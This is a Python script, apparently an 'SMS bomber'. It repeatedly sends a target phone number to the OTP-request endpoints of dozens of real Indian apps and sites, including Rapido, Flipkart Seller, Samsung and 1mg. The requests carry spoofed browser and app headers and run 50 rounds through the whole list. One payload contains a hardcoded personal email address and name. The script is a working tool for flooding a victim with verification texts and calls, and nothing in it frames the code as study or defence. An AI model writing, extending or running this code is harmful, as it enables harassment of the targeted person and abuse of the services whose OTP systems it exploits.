import requests
import time
import json

def smsgb(number):
    number = str(number)
    
    
   # start_time = time.time()
    
    #while time.time() - start_time < 60:  # Run for 3600 seconds (1 hour)
    for _ in range(50):
        apis = [
            {
                "url": "https://m.mirraw.com/accounts/send_otp",
                "payload": {"phone": number},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "url": "https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/",
                "payload": {"action": "generate", "phone": number, "access": "signup"},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
                "payload": {"mobile_number": number, "client_id": "kisan-app"},
                "headers": {"Content-Type": "application/json"}
            },
            
            {
                "url": "https://api.playo.io/onboard/generateOTP",
                "payload": {"countryCode": "+91", "mobile": number},
                "headers": {"Content-Type": "application/json"}
            },
            
            {
                "url": "https://app.classmateshop.co.in/graphql/",
                "payload": {"variables": {"email": "shivamrajput66207@gmail.com", "mobileNumber": number, "firstName": "shivam"},
                            "query": "mutation CreateUserMutation($email: String!, $firstName: String!, $mobileNumber: String!) {\n  createUser(email: $email, firstName: $firstName, mobileNumber: $mobileNumber) {\n    user {\n      id\n      dateOfBirth\n      mobileNumber\n      firstName\n      __typename\n    }\n    otp\n    __typename\n  }\n}",
                            "operationName": "CreateUserMutation"},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "url": "https://www.cuemath.com/api/v4/login/",
                "payload": {"country_code": "91", "phone": number, "action": "get_otp", "flow": "login"},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "url": "https://api.shadowfax.in/delivery/otp/send/",
                "payload": {"mobile_number": number},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "url": "https://customer.rapido.bike/api/otp",
                "payload": {"mobile": number},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
                "payload": {"buildVersion": "24.0", "phone": number, "source": "signup", "type": "p", "device": "mobile", "email": ""},
                "headers": {"Content-Type": "application/json"}
            },
            
            {
                "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
                "payload": {"isPlaycircle": "Fasle", "mobile": number, "deviceId": "1aeb7fad-58d0-4887-9f77-2a469039a413", "deviceName": "", "refCode": ""},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "url": "https://www.samsung.com/in/api/v1/sso/otp/init",
                "payload": {"user_id": number},
                "headers": {"Content-Type": "application/json"}
            },
           # {
           #     "url": "https://api.gromoinsure.com/v1/auth/sendOTP",
              #  "payload": {"phone": number},
            #    "headers": {"Content-Type": "application/json"}
          #  },
            {
                "url": "https://omni-api.moreretail.in/api/v1/login/",
                "payload": {"phone_number": number, "hash_key": "XfsoCeXADQA"},
                "headers": {"Content-Type": "application/json"}
            },
            {
                "url": "https://web-api.mpokket.in/registration/sendOtp",
                "payload": {"mobile": number},
                "headers": {"Content-Type": "application/json"}
            },
            
            {
                "url": "https://asset-transaction-api.rupyy.com/send/otp-v2",
                "payload": {"referenceId": number, "mobile": number, "type": "otp", "value": None, "product": "personalLoan", "retries": 1, "extraInfo": {}},
                "headers": {"Host": "asset-transaction-api.rupyy.com", "Content-Length": "128", "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"', "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?1", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36", "Sec-Ch-Ua-Platform": '"Android"', "Origin": "https://www.rupyy.com", "X-Requested-With": "pure.lite.browser", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.rupyy.com/", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9"},
            },
            {
                "url": "https://v2-api.bankopen.co/users/register/otp",
                "payload": {"username": number, "is_open_capital": 1},
                "headers": {"Host": "v2-api.bankopen.co", "Content-Length": "45", "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"', "X-API-Version": "3.1", "Sec-Ch-Ua-Mobile": "?1", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36", "Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "X-Client-Type": "Web", "Baggage": "sentry-environment=prod,sentry-release=app-open-money%405.2.0,sentry-public_key=76093829eb3048de9926891ff8e44fac,sentry-trace_id=08b4ebc206c84d3cbe6e8f38565ed92f", "Sentry-Trace": "08b4ebc206c84d3cbe6e8f38565ed92f-b5d07f68050b9a91-1", "Sec-Ch-Ua-Platform": '"Android"', "Origin": "https://app.opencapital.co.in", "X-Requested-With": "pure.lite.browser", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://app.opencapital.co.in/en/onboarding/login?utm_source=google&utm_medium=cpc&utm_campaign=IYD_Businessloans&utm_term=best%20loan%20app&gad_source=1&gclid=EAIaIQobChMIrP-6nKeIhQMVLBKDAx3JcwcPEAMYASAAEgKThPD_BwE", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9"},
            },
            {
                "url": "https://customer.rapido.bike/api/otp",
                "payload": {"mobile": number},
                "headers": {"Host": "customer.rapido.bike", "Content-Length": "23", "Cache-Control": "max-age=0", "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"', "Sec-Ch-Ua-Platform": '"Android"', "Sec-Ch-Ua-Mobile": "?1", "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "https://www.rapido.bike", "X-Requested-With": "pure.lite.browser", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9"},
            },
            {
            "url": "https://m.mirraw.com/accounts/send_otp",
            "payload": {"phone": number},
            "headers": {"Content-Type": "application/json"}
        },
        {
            "url": "https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/",
            "payload": {"action": "generate", "phone": number, "access": "signup"},
            "headers": {"Content-Type": "application/json"}
        },
        
        
        {
            "url": "https://api.khatabook.com/v1/auth/request-otp",
            "payload": {"country_code": "+91", "phone": number, "app_signature": "Jc/Zu7qNqQ2"},
            "headers": {'Host': 'api.khatabook.com', 'x-kb-platform': 'web', 'x-kb-app-locale': 'en', 'x-kb-new-auth': 'false', 'x-kb-app-name': 'Khatabook Website', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36', 'x-kb-app-version': '000100', 'Content-Type': 'application/json', 'Accept': '*/*', 'Origin': 'https://khatabook.com', 'X-Requested-With': 'pure.lite.browser', 'Sec-Fetch-Site': 'same-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://khatabook.com/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8'}
        },
        {
            "url": "https://www.tataplay.com/inception-pack/otp/resend-otp",
            "payload": {"id": number, "journeySource": "REGISTER"},
            "headers": {"Content-Type": "application/json"}
        },
        {
            "url": "https://seller.flipkart.com/napi/graphql",
            "payload": {"variables": {"mobileNo": number}, "query": "mutation SellerOnboarding_GenerateOTPMobile($mobileNo: String!) {\n generateOTPMobile(mobileNo: $mobileNo)\n}", "operationName": "SellerOnboarding_GenerateOTPMobile"},
            "headers": {"Content-Type": "application/json"}
        },
        {
            "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
            "payload": {"signInMobile": "+91" + number},
            "headers": {"Content-Type": "application/json"}
        },
        
        
        {
            "url": "https://api.1mg.com/api/v6/create_token",
            "payload": {"otp_on_call": True, "number": number},
            "headers": {"Host": "api.1mg.com", "x-platform": "Android-17.4.3", "x-access-key": "1mg_client_access_key", "x-device-id": "3dcc536049db72ae", "x-os-version": "13", "x-visitor-id": "739be15a-637d-46d8-c642-5a8d8f62215e_acce55_1692092552", "device-info": "Xiaomi/Redmi Note 7 Pro/33/13", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip", "Cookie": "VISITOR-ID=739be15a-637d-46d8-c642-5a8d8f62215e_acce55_1692092552", "User-Agent": "okhttp/4.10.0"}
        },
        {
            "url": "http://rummynabob.4599vip.com/api/game/app/exclude/bindPhoneCodeNoImgCode",
            "payload": {"id": 0, "projectSign": "rummynabob", "phone": "+91" + number},
            "headers": {"Accept-Encoding": "identity", "Accept-Language": "en", "Content-Type": "application/json", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 7 Pro Build/TQ3A.230605.012)", "Host": "rummynabob.4599vip.com", "Connection": "Keep-Alive"}
        },
        {
            "url": "https://api.beatoapp.com/v1/onboarding/generateotp",
            "payload": {"isdcode": "+91", "phone": number, "os": "android", "otptype": "sms", "email": "", "resend": False},
            "headers": {"Content-Type": "application/json; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 7 Pro Build/TQ3A.230605.012)", "Host": "api.beatoapp.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}
        }
            # Add more APIs here using the same structure
        ]
     #   for _ in range(200):
        # Iterating through the list of APIs and making requests
        for api in apis:
            response = requests.post(api["url"], json=api["payload"], headers=api["headers"])
          #  print(f"Request to {api['url']} - Status Code: {response.status_code}")
        
      #  time.sleep(1)  # Sleep for 1 second between iterations

# Example usage:
#smsg("92")  # Replace "1234567890" with the phone number you want to use
